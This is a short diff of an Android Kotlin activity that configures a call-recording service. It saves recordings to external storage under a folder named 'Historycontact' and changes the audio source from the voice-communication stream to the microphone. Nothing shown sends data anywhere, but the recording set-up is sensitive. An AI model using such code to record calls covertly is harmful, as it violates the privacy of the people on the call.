@@ -124,12 +124,12 @@ class TokenActivity : Activity() {
 
     private fun startCallService() {
         callRecord = CallRecord.Builder(this)
-                .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
+                .setRecordFileName("Record" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                 .setRecordDirName("Historycontact")
                 .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                 .setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                 .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                .setAudioSource(MediaRecorder.AudioSource.MIC)
                 .setShowSeed(true)
                 .build()
 
